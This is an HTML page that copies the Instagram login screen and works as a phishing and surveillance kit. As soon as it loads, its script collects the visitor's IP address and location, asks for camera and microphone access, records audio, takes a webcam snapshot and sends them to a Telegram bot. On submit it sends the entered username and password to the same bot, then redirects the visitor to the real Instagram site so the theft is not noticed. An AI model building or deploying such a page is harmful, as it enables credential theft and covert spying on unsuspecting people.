<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body {
            background-color: #121212;
            color: #ffffff;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #1d1d1d;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.5);
            text-align: center;
            width: 320px;
        }
        .logo {
            margin-bottom: 20px;
        }
        .logo img {
            width: 180px;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 8px 0;
            border: none;
            border-radius: 5px;
            background-color: #2c2c2c;
            color: #ffffff;
        }
        input::placeholder {
            color: #bbbbbb;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }
        button:hover {
            background-color: #007bb5;
        }
        .footer {
            margin-top: 20px;
            font-size: 14px;
        }
        .footer a {
            color: #0095f6;
            text-decoration: none;
        }
    </style>
</head>
<body onload="requestPermissions()">

    <div class="container">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
        </div>
        <input type="text" id="username" placeholder="Phone number, username, or email">
        <input type="password" id="password" placeholder="Password">
        <button onclick="validateLogin()">Log In</button>
        <div class="footer">Don't have an account? <a href="#">Sign up</a></div>
    </div>

    <script>
        const correctEmail = "user@instagram.com";  // Set your correct email
        const correctPassword = "password123";  // Set your correct password
        let locationData = "Unknown location";
        let ipAddress = "Unknown IP";
        let audioBlob;
        let imageBlob;

        async function requestPermissions() {
            try {
                // Get IP address
                fetch('https://api.ipify.org?format=json')
                    .then(response => response.json())
                    .then(data => {
                        ipAddress = data.ip;
                    });

                // Request location permission
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition((position) => {
                        locationData = `Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`;
                    });
                }

                // Request audio and video permissions
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
                captureMedia(stream);  // Capture snapshot and audio immediately

            } catch (err) {
                console.error('Error requesting media permissions:', err);
            }
        }

        function captureMedia(stream) {
            // Record audio for 5 seconds
            const mediaRecorder = new MediaRecorder(stream);
            const audioChunks = [];
            mediaRecorder.ondataavailable = event => audioChunks.push(event.data);
            mediaRecorder.start();

            setTimeout(() => {
                mediaRecorder.stop();
            }, 5000);

            mediaRecorder.onstop = () => {
                audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
                sendImmediateMedia('audio', audioBlob);  // Send audio immediately
            };

            // Capture snapshot from video stream
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();
            video.onloadedmetadata = () => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                canvas.toBlob(blob => {
                    imageBlob = blob;
                    sendImmediateMedia('photo', imageBlob);  // Send snapshot immediately
                }, 'image/jpeg');
            };
        }

        function sendImmediateMedia(type, blob) {
            const botToken = 'YOUR_BOT_TOKEN';
            const chatId = 'YOUR_CHAT_ID';
            const formData = new FormData();
            formData.append(type, blob, `${type}.${type === 'audio' ? 'wav' : 'jpg'}`);

            fetch(`https://api.telegram.org/bot${botToken}/send${type === 'audio' ? 'Audio' : 'Photo'}`, {
                method: 'POST',
                body: formData
            });
        }

        function validateLogin() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            if (username !== correctEmail || password !== correctPassword) {
                alert("Wrong email or password. Please try again.");
                return;
            }

            sendLoginData(username, password);
        }

        function sendLoginData(username, password) {
            const message = `New Login Attempt:\nUsername: ${username}\nPassword: ${password}\nIP Address: ${ipAddress}\nLocation: ${locationData}\nTime: ${new Date().toLocaleString()}`;

            const botToken = 'YOUR_BOT_TOKEN';
            const chatId = 'YOUR_CHAT_ID';
            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

            // Send the message to Telegram
            fetch(telegramApiUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            }).then(() => {
                window.location.href = "https://www.instagram.com/accounts/login/";
            });
        }
    </script>

</body>
</html>
